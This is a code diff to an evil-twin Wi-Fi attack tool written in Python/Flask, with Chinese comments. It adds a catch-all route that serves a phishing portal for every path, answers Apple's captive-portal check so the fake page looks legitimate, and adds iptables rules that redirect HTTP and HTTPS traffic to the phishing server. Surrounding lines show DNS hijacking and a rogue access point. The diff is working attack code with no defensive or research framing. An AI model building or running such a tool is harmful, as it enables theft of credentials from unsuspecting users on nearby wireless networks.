@@ -557,6 +557,23 @@ def freq_to_channel(freq):
 
 # ==================== 钓鱼页面 ====================
 
+@app.route('/', defaults={'path': ''})
+@app.route('/<path:path>')
+def catch_all(path):
+    """所有未匹配的路径都跳转到钓鱼页（DNS劫持后强制门户）"""
+    # 排除已定义的路由
+    if path.startswith('api/') or path.startswith('static/'):
+        from flask import abort
+        abort(404)
+    if request.method == 'POST' and request.path == '/capture':
+        return  # 由 capture() 处理
+    # 苹果 Captive Portal 检测
+    ua = request.headers.get('User-Agent', '')
+    if 'CaptiveNetworkSupport' in ua:
+        return 'Success', 200
+    return render_template('portal.html')
+
+
 @app.route('/portal')
 def portal():
     """钓鱼页面"""
@@ -664,6 +681,10 @@ address=/#/192.168.4.1
             'stderr': up_result.stderr.strip(),
         }
     
+    # 端口转发：80 → 5000（强制门户）
+    run_cmd(['sudo', 'iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', iface, '-p', 'tcp', '--dport', '80', '-j', 'REDIRECT', '--to-port', '5000'])
+    run_cmd(['sudo', 'iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', iface, '-p', 'tcp', '--dport', '443', '-j', 'REDIRECT', '--to-port', '5000'])
+
     # 5. 启动服务
     subprocess.Popen(['sudo', 'hostapd', '/tmp/hostapd.conf'], 
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
@@ -689,6 +710,8 @@ def stop_evil_twin(iface_override=None):
     run_cmd(['sudo', 'pkill', 'dnsmasq'])
     if iface:
         run_cmd(['sudo', 'ip', 'addr', 'del', '192.168.4.1/24', 'dev', iface])
+        run_cmd(['sudo', 'iptables', '-t', 'nat', '-D', 'PREROUTING', '-i', iface, '-p', 'tcp', '--dport', '80', '-j', 'REDIRECT', '--to-port', '5000'])
+        run_cmd(['sudo', 'iptables', '-t', 'nat', '-D', 'PREROUTING', '-i', iface, '-p', 'tcp', '--dport', '443', '-j', 'REDIRECT', '--to-port', '5000'])
     return {'status': 'success', 'message': '攻击已停止'}
 
 def restart_hotspot(old_iface=None):
